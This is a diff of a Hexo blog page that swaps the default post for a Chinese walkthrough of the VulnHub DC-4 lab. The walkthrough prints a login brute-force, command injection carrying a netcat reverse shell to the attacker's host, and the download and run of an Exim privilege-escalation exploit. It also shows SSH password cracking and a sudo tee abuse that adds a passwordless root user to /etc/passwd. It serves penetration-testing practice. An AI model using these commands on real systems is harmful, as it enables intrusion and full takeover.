@@ -10,7 +10,7 @@
     
     
     
-    <title>Hello World | Hexo</title>
+    <title>DC4-Try | Hexo</title>
     <!-- inject:style -->
     <link href="/css/style.css" rel="stylesheet" type="text/css">
     <!-- endinject -->
@@ -161,13 +161,13 @@
     <div class="cube-content">
         <div class="cube-left">
             <div class="cube-article">
-    <h1 class="title">Hello World</h1>
+    <h1 class="title">DC4-Try</h1>
         
             <div class="cube-article-header">
                 <div class="cube-article-date">
                     <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
                     <!-- moment.js对象 -->
-                    2024-04-14
+                    2024-07-27
                 </div>
                 <div class="cube-article-tags">
     <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
@@ -177,19 +177,85 @@
             
                     <div class="cube-article-content cube-markdown">
                         
-                            <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+                            <h1 id="1下载dc机"><a href="#1下载dc机" class="headerlink" title="1下载dc机"></a>1下载dc机</h1><p><a href="https://www.[vulnhub](https://so.csdn.net/so/search?q=vulnhub&spm=1001.2101.3001.7020).com/entry/dc-4,313/">https://www.[vulnhub](https://so.csdn.net/so/search?q=vulnhub&amp;spm=1001.2101.3001.7020).com/entry/dc-4,313/</a></p>
+<p>改为net模式</p>
+<span id="more"></span>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<h1 id="2信息收集"><a href="#2信息收集" class="headerlink" title="2信息收集"></a>2信息收集</h1><p>（1）寻ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">或</span><br><span class="line">nmap -sP 192.168.49.0/24</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>出133</p>
+<p>（2）端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v-A192.168.49.133</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>看到22和80端口</p>
+<p>这个就可以看出没用框架</p>
+<p>（3）访问192.168.49.133  </p>
+<p>一个登录框</p>
+<p>用这个看了一下，没用框架  wappalyzer</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb url</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p>没出来其他东西及一个index</p>
+<p>直接bp抓包看有没有sql注入</p>
+<p><img src="/2024/07/27/DC4-Try/1.png" alt="DC4-Try"></p>
+<p>长度相同，sql注入</p>
+<p><img src="/2024/07/27/DC4-Try/2.png" alt="DC4-Try"></p>
+<p>改成cluster bomb</p>
+<p>上sqlpayload没有</p>
+<p>猜测admin  爆密码</p>
+<p><img src="/2024/07/27/DC4-Try/3.png" alt="DC4-Try"></p>
+<p>爆出密码happy</p>
+<p>登录</p>
+<p><img src="/2024/07/27/DC4-Try/4.png" alt="DC4-Try"></p>
+<p>run一下 ls -l抓包</p>
+<p><img src="/2024/07/27/DC4-Try/5.png" alt="DC4-Try"></p>
+<p>这个空格变成+</p>
+<p>改成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip+addr</span><br></pre></td></tr></table></figure>
+
+<p>执行了但 ifconfig没执行</p>
+<p>无所谓了直接反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc+192.168.49.129+8080+-e+/bin/bash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvnp 8080</span><br></pre></td></tr></table></figure>
+
+<p>直接 开启交互式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id或whoami</span><br></pre></td></tr></table></figure>
+
+<p>不是root</p>
+<h1 id="3提权"><a href="#3提权" class="headerlink" title="3提权"></a>3提权</h1><p>第一种</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/27/DC4-Try/6.png" alt="DC4-Try"></p>
+<p>看到exim4这个可以提权的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exim4 --version</span><br></pre></td></tr></table></figure>
+
+<p>看到4.89</p>
+<p>再开一个kali</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit exim 4</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/27/DC4-Try/7.png" alt="DC4-Try"></p>
+<p>看到一个4.87-91的刚好符合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">systemctl start apache2.service</span><br><span class="line">发现开不开，没事</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/46996.sh ./</span><br><span class="line">再</span><br><span class="line">python3 -m http.server 8888</span><br><span class="line">访问 192.168.49.129就是这个目录</span><br><span class="line">直接</span><br><span class="line">在反弹shell上</span><br><span class="line">wget http://192.168.49.129:8888/46996.sh</span><br><span class="line">发现没权限</span><br><span class="line">cd /tmp</span><br><span class="line">再下载即可</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 46996.sh</span><br><span class="line">./46996.sh</span><br><span class="line">获得root权限</span><br><span class="line">flag再root下</span><br><span class="line">或者</span><br><span class="line">find / -name *flag*   也可以找到</span><br></pre></td></tr></table></figure>
+
+
+
+<p>另一种</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cd /home   </span><br><span class="line">ls  //看到jim</span><br><span class="line">cd jim</span><br><span class="line">ls</span><br><span class="line">cd backups</span><br><span class="line">ls</span><br><span class="line">cat old-passwords.bak  #找到密码</span><br><span class="line">vim mm.txt #密码放到里面</span><br><span class="line">hydra -l jim -P mm.txt 192.168.49.133 ssh</span><br><span class="line">爆出jim的密码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/27/DC4-Try/8.png" alt="DC4-Try"></p>
+<p>[22][ssh] host: 192.168.49.133   login: jim   password: jibril04</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ssh jim@192.168.49.133 </span><br><span class="line">ls //考到mbox</span><br><span class="line">cat mbox #这个是一个邮件</span><br><span class="line">cd /var/spool/mail //linux默认邮箱位置</span><br><span class="line">ls  看到jim</span><br><span class="line">cat jim   看到一封信  署名是charles 密码 ^xHhA&amp;hvim0y</span><br><span class="line">su charles   </span><br><span class="line">发现还不是root</span><br><span class="line">sudo -l</span><br><span class="line">看到/usr/bin/teehee是root</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/27/DC4-Try/9.png" alt="DC4-Try"></p>
+<p>写入一句话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">su admin</span><br><span class="line">获得root权限</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/27/DC4-Try/10.png" alt="DC4-Try"></p>
 
                     </div>
 </div>
@@ -197,14 +263,14 @@
     <div class="cube-article-nav">
         <ul>
             
-                <li class="prev">
-                    <a href="/2024/04/14/1/">
-                        <i class="cube-icon cube-prev" aria-hidden="true"></i>
-                        1
-                    </a>
-                </li>
-                
                     
+                        <li class="next">
+                            <a href="/2024/07/26/DC3-2Try/">
+                                DC3-2Try
+                                    <i class="cube-icon cube-next" aria-hidden="true"></i>
+                            </a>
+                        </li>
+                        
         </ul>
     </div>
     
